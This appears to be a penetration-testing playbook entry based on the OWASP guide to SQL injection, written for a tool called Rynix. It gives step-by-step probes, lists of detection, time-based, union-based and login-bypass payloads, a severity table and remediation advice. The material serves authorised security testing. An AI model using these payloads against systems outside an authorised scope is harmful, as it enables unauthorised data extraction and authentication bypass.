---
id: WSTG-INPV-05
title: Testing for SQL Injection
category: Input Validation
severity_range: High-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
---

# WSTG-INPV-05: Testing for SQL Injection

## Summary

SQL Injection occurs when user-supplied input is incorporated into SQL queries without proper sanitization or parameterization. It can lead to unauthorized data access, data modification, authentication bypass, and in severe cases, operating system command execution.

## Test Objectives

- Identify parameters susceptible to SQL injection
- Determine the type of SQL injection (error-based, blind, time-based, union-based)
- Assess the database type and potential impact

## Prerequisites

- Target application interacts with a database
- Input parameters have been mapped (WSTG-INFO-06)
- Docker pentest container is capturing traffic

## Test Steps

### Step 1: Identify Injection Points

**CLI Actions:**
1. Use `curl` to identify all parameters that likely interact with the database:
   - Login forms (username/password)
   - Search functions
   - URL parameters with IDs (`?id=1`, `?user=admin`)
   - Sort/filter parameters (`?sort=name&order=asc`)
   - API endpoints with query parameters
2. Use `save to manual-review file` for each candidate endpoint

### Step 2: Test for Error-Based SQL Injection

**CLI Actions:**
Use `curl` to inject SQL meta-characters and observe error responses:

```
GET /product?id=1' HTTP/1.1
Host: target.com
```

```
GET /product?id=1" HTTP/1.1
Host: target.com
```

```
GET /product?id=1) HTTP/1.1
Host: target.com
```

**What to Look For:**
- SQL error messages (e.g., "You have an error in your SQL syntax")
- Database-specific errors revealing the DB type (MySQL, PostgreSQL, MSSQL, Oracle)
- Stack traces containing SQL queries
- Different response compared to the normal request

### Step 3: Confirm with Boolean-Based Tests

**CLI Actions:**
Use `curl` to send true and false conditions:

```
GET /product?id=1 AND 1=1 HTTP/1.1    (should return normal result)
GET /product?id=1 AND 1=2 HTTP/1.1    (should return different/empty result)
```

String-based:
```
GET /search?q=test' AND '1'='1 HTTP/1.1    (normal result)
GET /search?q=test' AND '1'='2 HTTP/1.1    (different result)
```

If responses differ, SQL injection is confirmed.

### Step 4: Test Time-Based Blind SQL Injection

**CLI Actions:**
Use `curl` and measure response times:

**MySQL:**
```
GET /product?id=1 AND SLEEP(5) HTTP/1.1
GET /product?id=1' AND SLEEP(5)-- - HTTP/1.1
```

**PostgreSQL:**
```
GET /product?id=1; SELECT pg_sleep(5)-- HTTP/1.1
```

**MSSQL:**
```
GET /product?id=1; WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

If the response is delayed by ~5 seconds, time-based blind SQLi is confirmed.

### Step 5: Test Union-Based SQL Injection

**CLI Actions:**
1. Determine the number of columns with `curl`:
   ``
   GET /product?id=1 ORDER BY 1-- HTTP/1.1    (success)
   GET /product?id=1 ORDER BY 2-- HTTP/1.1    (success)
   GET /product?id=1 ORDER BY 3-- HTTP/1.1    (success)
   GET /product?id=1 ORDER BY 4-- HTTP/1.1    (error = 3 columns)
   ``

2. Test UNION SELECT:
   ``
   GET /product?id=-1 UNION SELECT 1,2,3-- HTTP/1.1
   ``

3. Extract database information:
   ``
   GET /product?id=-1 UNION SELECT version(),user(),database()-- HTTP/1.1
   ``

### Step 6: Test Authentication Bypass

**CLI Actions:**
Use `curl` to test login bypass:
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1&password=anything
```

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything
```

## Payloads

### Detection Payloads
```
'
"
)
')
")
`
1' OR '1'='1
1" OR "1"="1
1' OR '1'='1'--
1' OR '1'='1'#
1' OR '1'='1'/*
```

### Boolean-Based Payloads
```
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2
1" AND "1"="1
1" AND "1"="2
```

### Time-Based Payloads
```
1' AND SLEEP(5)-- -
1' AND (SELECT SLEEP(5))-- -
1; WAITFOR DELAY '0:0:5'--
1'; SELECT pg_sleep(5)--
1' AND BENCHMARK(5000000,SHA1('test'))-- -
```

### Union-Based Payloads
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-1 UNION SELECT 1,2,3--
-1 UNION SELECT version(),user(),database()--
```

### Authentication Bypass Payloads
```
admin' OR '1'='1
admin'--
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
") OR ("1"="1
') OR ('1'='1
```

### Comment Syntax by Database
```
MySQL:  -- - (note the space and dash) or #
MSSQL:  --
Oracle: --
PostgreSQL: --
```

### NoSQL Injection Testing with nosqli

**CLI Actions:**
If the application uses a NoSQL database (MongoDB, CouchDB, etc.), use `nosqli` for automated detection:

```bash
rynix_plugin_run('wstg') nosqli scan -t "https://target.com/api/users?username=test"
```

nosqli tests for error-based, boolean-blind, and timing-based NoSQL injection. Always verify nosqli findings manually with curl before logging.

**Indicators of NoSQL database**: MongoDB error messages, JSON-based APIs with query operators (`$gt`, `$ne`, `$regex`), Node.js/Express backend, MongoDB connection strings in config leaks.

## Detection Criteria

A finding should be logged when:
- SQL error messages are returned in response to meta-characters
- Boolean conditions produce different responses (true vs false)
- Time-based payloads cause measurable response delays
- UNION SELECT returns additional data
- Authentication can be bypassed with SQL payloads

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Union-based SQLi allows data extraction | Critical |
| Authentication bypass via SQLi | Critical |
| Blind SQLi (boolean or time-based) confirmed | High |
| Error-based SQLi reveals database structure | High |
| SQL errors disclosed but injection not fully confirmed | Medium |
| Parameterized queries used but error messages disclosed | Low |

## Remediation

- Use parameterized queries / prepared statements for ALL database interactions
- Use ORM frameworks that handle parameterization automatically
- Apply input validation (allowlist approach) as defense in depth
- Implement least-privilege database accounts
- Disable detailed error messages in production
- Use a Web Application Firewall (WAF) as additional defense layer
- Regularly audit code for raw SQL query construction

## References

- [OWASP Testing Guide - SQL Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

